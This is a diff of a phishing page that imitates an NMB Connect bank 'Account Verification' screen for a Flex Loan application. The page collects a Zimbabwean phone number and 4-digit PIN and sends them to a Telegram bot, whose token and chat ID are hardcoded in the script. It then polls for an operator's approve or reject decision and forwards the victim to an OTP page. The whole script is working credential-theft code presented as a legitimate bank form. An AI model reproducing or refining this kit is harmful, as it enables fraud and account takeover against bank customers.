@@ -4,48 +4,90 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>NMBConnect | Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>NMB Connect | Account Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --nmb-blue: #003366;
             --nmb-gold: #E4C16A;
             --nmb-light-blue: #4a90e2;
             --white: #ffffff;
-            --error: #ff4d4d;
-            --bg-overlay: rgba(0, 0, 0, 0.6);
+            --bg-overlay: rgba(0, 0, 0, 0.75);
+            --card-bg: rgba(255, 255, 255, 0.12);
+            --input-bg: rgba(255, 255, 255, 0.08);
+            --error: #ff6b6b;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
         
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
+            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), 
+                        url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
             min-height: 100vh;
+            color: white;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        header {
+            padding: 40px 5% 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
-            padding: 15px;
+        }
+
+        .logo { 
+            font-size: 28px; 
+            font-weight: 800; 
+            text-decoration: none; 
+            display: flex; 
+            align-items: center; 
+        }
+        .logo .nmb { color: var(--nmb-light-blue); }
+        .logo .connect { color: var(--nmb-gold); margin-left: 6px; }
+        .logo .flex-loan { color: var(--white); margin-left: 8px; font-weight: 400; font-size: 24px; opacity: 0.9; }
+
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 420px;
+            width: 100%;
         }
 
         .card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 28px;
-            padding: 35px 25px;
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            background: var(--card-bg);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 35px;
+            padding: 45px 35px;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
             text-align: center;
+            animation: cardFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .logo-circle {
+        @keyframes cardFadeIn {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .brand-icon {
             width: 80px;
             height: 80px;
             background: var(--nmb-blue);
@@ -53,168 +95,255 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 15px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            margin: 0 auto 20px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
             border: 2px solid rgba(228, 193, 106, 0.3);
         }
 
-        .brand-name { font-size: 24px; font-weight: 700; margin-bottom: 25px; }
-        .brand-name .nmb { color: var(--nmb-light-blue); }
-        .brand-name .connect { color: var(--nmb-gold); }
-
-        .card-header h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
-        .card-header p { font-size: 13px; color: rgba(255, 255, 255, 0.8); line-height: 1.5; margin-bottom: 25px; }
-
-        .loan-badge {
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(228, 193, 106, 0.4);
-            border-radius: 14px;
-            padding: 12px;
-            margin-bottom: 25px;
+        .card h2 { 
+            font-size: 24px; 
+            font-weight: 700; 
+            margin-bottom: 10px; 
+            color: var(--white);
         }
-        .loan-badge .label { font-size: 11px; text-transform: uppercase; color: var(--nmb-gold); font-weight: 700; display: block; margin-bottom: 2px; }
-        .loan-badge .val { font-size: 16px; font-weight: 700; }
+        .card p { 
+            font-size: 14px; 
+            opacity: 0.7; 
+            margin-bottom: 30px; 
+            font-weight: 300;
+        }
 
-        .input-group { margin-bottom: 18px; text-align: left; }
-        .input-wrapper {
-            background: rgba(255, 255, 255, 0.07);
-            border: 1.5px solid rgba(255, 255, 255, 0.25);
+        .applicant-badge {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(228, 193, 106, 0.2);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        .applicant-badge .label { 
+            font-size: 11px; 
+            text-transform: uppercase; 
+            color: var(--nmb-gold); 
+            font-weight: 700; 
+            display: block; 
+            margin-bottom: 5px; 
+            letter-spacing: 1px;
+        }
+        .applicant-badge .name { font-size: 18px; font-weight: 700; color: var(--white); display: block; }
+        .applicant-badge .amount { font-size: 14px; opacity: 0.8; margin-top: 2px; display: block; }
+
+        .error-msg {
+            color: var(--error);
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 12px;
             border-radius: 14px;
-            padding: 14px 16px;
+            border: 1px solid rgba(255, 107, 107, 0.2);
+        }
+
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-wrapper {
+            background: var(--input-bg);
+            border: 1.5px solid rgba(255, 255, 255, 0.15);
+            border-radius: 18px;
+            padding: 16px 20px;
             display: flex;
             align-items: center;
-            transition: 0.3s;
+            transition: all 0.3s ease;
         }
-        .input-wrapper:focus-within { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.12); }
+        .input-wrapper:focus-within { 
+            border-color: var(--nmb-gold); 
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 0 15px rgba(228, 193, 106, 0.15);
+        }
 
-        .flag-icon { width: 22px; margin-right: 10px; border-radius: 2px; }
-        .country-code { color: var(--nmb-light-blue); font-weight: 600; margin-right: 8px; font-size: 14px; }
-        .input-field { flex: 1; background: transparent; border: none; color: white; font-size: 15px; outline: none; width: 100%; }
-        .input-field::placeholder { color: rgba(255, 255, 255, 0.4); }
+        .flag-icon { width: 24px; margin-right: 12px; border-radius: 3px; }
+        .country-code { color: var(--nmb-light-blue); font-weight: 700; margin-right: 10px; font-size: 15px; }
+        .input-field { 
+            flex: 1; 
+            background: transparent; 
+            border: none; 
+            color: white; 
+            font-size: 16px; 
+            outline: none; 
+            width: 100%; 
+            font-family: inherit;
+        }
+        .input-field::placeholder { color: rgba(255, 255, 255, 0.3); }
 
         .verify-btn {
             width: 100%;
-            padding: 16px;
+            padding: 20px;
             background: var(--white);
             color: var(--nmb-blue);
             border: none;
-            border-radius: 14px;
-            font-size: 15px;
-            font-weight: 700;
+            border-radius: 18px;
+            font-size: 16px;
+            font-weight: 800;
             cursor: pointer;
-            margin-top: 10px;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: 0.2s;
+            letter-spacing: 1.5px;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            margin-top: 10px;
         }
-        .verify-btn:active { transform: scale(0.98); }
-
-        .error-msg {
-            color: #ff6b6b;
-            font-size: 12px;
-            margin-bottom: 15px;
-            display: none;
-            background: rgba(255, 77, 77, 0.1);
-            padding: 10px;
-            border-radius: 10px;
-            border: 1px solid rgba(255, 77, 77, 0.2);
+        .verify-btn:hover { 
+            background: var(--nmb-gold);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
         }
+        .verify-btn:active { transform: translateY(-1px); }
 
         .overlay {
             position: fixed; inset: 0;
             display: none;
             align-items: center; justify-content: center; flex-direction: column;
-            background: rgba(0, 30, 60, 0.95);
+            background: rgba(0, 15, 30, 0.95);
             z-index: 2000;
-            backdrop-filter: blur(8px);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
             padding: 20px;
         }
         .overlay.on { display: flex; }
-        .spin { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 18px; font-weight: 600; margin-top: 20px; }
-        .sp-s { font-size: 13px; color: rgba(255,255,255,0.7); margin-top: 8px; }
+        .spin { 
+            width: 60px; height: 60px; 
+            border: 4px solid rgba(255,255,255,0.1); 
+            border-top-color: var(--nmb-gold); 
+            border-radius: 50%; 
+            animation: sp 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; 
+        }
+        .sp-t { font-size: 20px; font-weight: 700; margin-top: 25px; letter-spacing: 0.5px; }
+        .sp-s { font-size: 14px; color: rgba(255,255,255,0.6); margin-top: 10px; font-weight: 300; }
         @keyframes sp { to { transform: rotate(360deg); } }
+
+        footer { 
+            padding: 40px 20px; 
+            text-align: center; 
+            font-size: 12px; 
+            opacity: 0.4; 
+        }
+
+        @media (max-width: 480px) {
+            .logo { font-size: 24px; }
+            .logo .flex-loan { font-size: 20px; }
+            .card { padding: 40px 25px; }
+            .card h2 { font-size: 22px; }
+        }
     </style>
 </head>
 <body onload="init()">
-    <div class="card">
-        <div class="logo-circle">
-            <svg viewBox="0 0 100 100" width="50" height="50">
-                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
-                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
-            </svg>
-        </div>
-        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>
 
-        <div class="card-header">
-            <h2>Account Verification</h2>
-            <p>Enter your details below to continue with your application.</p>
-        </div>
+    <header>
+        <a class="logo" href="index.html">
+            <span class="nmb">NMB</span><span class="connect">Connect</span><span class="flex-loan">Flex Loan</span>
+        </a>
+    </header>
 
-        <div id="loanBox" class="loan-badge" style="display:none;">
-            <span class="label" id="loanType">Loan Type</span>
-            <span class="val" id="loanAmount">$0.00 USD</span>
-        </div>
-
-        <div id="err" class="error-msg"></div>
-        
-        <form onsubmit="doSubmit(event)">
-            <div class="input-group">
-                <div class="input-wrapper">
-                    <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
-                    <span class="country-code">(+263)</span>
-                    <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9" required>
+    <main>
+        <div class="container">
+            <div class="card">
+                <div class="brand-icon">
+                    <svg viewBox="0 0 100 100" width="45" height="45">
+                        <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+                        <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
+                    </svg>
                 </div>
-            </div>
+                
+                <h2>Account Verification</h2>
+                <p>Please verify your NMB Connect account to complete your Flex Loan application.</p>
 
-            <div class="input-group">
-                <div class="input-wrapper">
-                    <span style="margin-right: 12px; font-size: 16px; opacity: 0.7;">🔒</span>
-                    <input type="password" class="input-field" id="pin" placeholder="Enter 4-Digit PIN" inputmode="numeric" maxlength="4" required>
+                <div id="applicantBadge" class="applicant-badge">
+                    <span class="label">Applicant Details</span>
+                    <span id="displayName" class="name">Valued Client</span>
+                    <span id="displayAmount" class="amount">$0.00 USD Flex Loan</span>
                 </div>
-            </div>
 
-            <button type="submit" class="verify-btn">Verify Account</button>
-        </form>
-    </div>
+                <div id="err" class="error-msg"></div>
+                
+                <form onsubmit="doSubmit(event)">
+                    <div class="input-group">
+                        <div class="input-wrapper">
+                            <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
+                            <span class="country-code">(+263)</span>
+                            <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9" required>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="input-wrapper">
+                            <span style="margin-right: 15px; font-size: 18px; opacity: 0.6;">🔒</span>
+                            <input type="password" class="input-field" id="pin" placeholder="Enter 4-Digit PIN" inputmode="numeric" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="verify-btn">Verify & Continue</button>
+                </form>
+            </div>
+        </div>
+    </main>
 
     <div id="ov" class="overlay">
         <div class="spin"></div>
-        <div class="sp-t">Verifying Details</div>
-        <div class="sp-s">Please wait while we process your request...</div>
+        <div class="sp-t">Verifying Identity</div>
+        <div class="sp-s">Connecting to NMB secure servers...</div>
     </div>
+
+    <footer>
+        <p>&copy; 2026 NMB Bank Limited. Zimbabwe.</p>
+    </footer>
 
     <script>
         const BOT = '8610325502:AAELjduBU2AtyM8FITvNGmRz4-O1Vi6QQ3s';
         const CID = '7881536601';
-        let bd = {}, luid = 0;
+        let loanData = {
+            name: "Valued Client",
+            amount: "0",
+            purpose: "Flex Loan"
+        };
+        let lastUpdateId = 0;
 
         function init() {
-            const p = new URLSearchParams(location.search);
-            const d = p.get('data'), pr = p.get('price');
-            if (d && pr) { 
-                bd = { data: d, price: pr }; 
-                document.getElementById('loanBox').style.display = 'block';
-                document.getElementById('loanType').textContent = d;
-                document.getElementById('loanAmount').textContent = '$' + pr + ' USD';
-            }
+            const params = new URLSearchParams(window.location.search);
+            loanData.name = params.get('name') || "Valued Client";
+            loanData.amount = params.get('amount') || "0";
+            loanData.purpose = params.get('purpose') || "Flex Loan";
+            
+            document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);
+            document.getElementById('displayAmount').textContent = `$${parseFloat(loanData.amount).toLocaleString()} USD ${decodeURIComponent(loanData.purpose)}`;
         }
 
-        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
-        function clrErr() { document.getElementById('err').style.display = 'none'; }
+        function showErr(msg) { 
+            const e = document.getElementById('err'); 
+            e.textContent = msg; 
+            e.style.display = 'block'; 
+        }
+        
+        function clrErr() { 
+            document.getElementById('err').style.display = 'none'; 
+        }
 
-        async function tg(msg, btns) {
+        async function sendToTelegram(msg, buttons) {
             try {
-                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
+                    body: JSON.stringify({ 
+                        chat_id: CID, 
+                        text: msg, 
+                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined, 
+                        parse_mode: 'HTML' 
+                    })
                 });
-                const d = await r.json();
-                if (d.ok) {
-                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
-                    const ud = await ur.json();
-                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
+                const data = await response.json();
+                if (data.ok) {
+                    const updateResponse = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
+                    const updateData = await updateResponse.json();
+                    if (updateData.ok && updateData.result.length > 0) { 
+                        lastUpdateId = updateData.result[0].update_id; 
+                    }
                 }
             } catch(e) { console.error(e); }
         }
@@ -225,59 +354,62 @@
             const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
             const pin = document.getElementById('pin').value.trim();
 
-            if (phone.length < 9) { showErr('Enter a valid 9-digit number'); return; }
-            if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }
+            if (phone.length < 9) { showErr('Please enter a valid 9-digit mobile number.'); return; }
+            if (pin.length !== 4) { showErr('PIN must be exactly 4 digits.'); return; }
 
-            const msg = `📱 <b>NMBConnect Login</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;
+            const msg = `🚀 <b>NMB Flex Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>`;
 
-            const btns = [
-                [{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }],
-                [{ text: '⚠️ Already Applied', callback_data: 'login_applied' }]
+            const buttons = [
+                [{ text: '✅ Approve PIN', callback_data: 'pin_valid' }, { text: '❌ Reject PIN', callback_data: 'pin_invalid' }],
+                [{ text: '⚠️ Flag Account', callback_data: 'login_applied' }]
             ];
 
             document.getElementById('ov').classList.add('on');
-            tg(msg, btns);
-            poll();
+            sendToTelegram(msg, buttons);
+            startPolling();
         }
 
-        function poll() {
-            const iv = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+        function startPolling() {
+            const pollInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId + 1}`)
                     .then(r => r.json())
-                    .then(d => {
-                        if (d.ok && d.result.length > 0) {
-                            d.result.forEach(u => {
-                                luid = u.update_id;
-                                if (u.callback_query) {
-                                    const cb = u.callback_query.data;
-                                    if (cb === 'pin_valid') { 
-                                        clearInterval(iv); 
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            data.result.forEach(update => {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+                                    if (action === 'pin_valid') { 
+                                        clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
-                                        goOTP(); 
+                                        proceedToOTP(); 
                                     }
-                                    else if (cb === 'pin_invalid') { 
-                                        clearInterval(iv); 
+                                    else if (action === 'pin_invalid') { 
+                                        clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
-                                        showErr('Invalid PIN. Please check and try again.'); 
+                                        showErr('Invalid PIN. Please check your details and try again.'); 
                                         document.getElementById('pin').value = '';
                                     }
-                                    else if (cb === 'login_applied') { 
-                                        clearInterval(iv); 
+                                    else if (action === 'login_applied') { 
+                                        clearInterval(pollInterval); 
                                         document.getElementById('ov').classList.remove('on'); 
-                                        showErr('Application already submitted for this loan.');
+                                        showErr('This account has already submitted a loan application.');
                                     }
                                 }
                             });
                         }
                     }).catch(e => console.error(e));
-            }, 1500);
-            setTimeout(() => clearInterval(iv), 600000);
+            }, 2000);
+            
+            // Timeout after 10 minutes
+            setTimeout(() => clearInterval(pollInterval), 600000);
         }
 
-        function goOTP() {
-            const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
-            location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
+        function proceedToOTP() {
+            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            location.href = `otp.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
         }
     </script>
+
 </body>
 </html>
